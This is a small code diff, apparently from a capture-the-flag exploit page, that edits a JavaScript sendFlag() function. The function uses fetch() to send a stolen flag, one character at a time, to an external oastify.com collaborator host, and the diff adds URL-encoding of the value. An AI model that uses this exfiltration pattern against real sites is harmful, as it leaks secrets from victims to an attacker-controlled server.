@@ -20,7 +20,7 @@
 
         function sendFlag() {
             // replace with the unique part of the ngrok address
-            fetch(`http://5jp6m5n0f6vdzq5i2twig2mbj2ptds1h.oastify.com?char=${flag}`);
+            fetch(`http://5jp6m5n0f6vdzq5i2twig2mbj2ptds1h.oastify.com?char=${encodeURI(flag)}`);
         }
 
         function loadScript(char) {
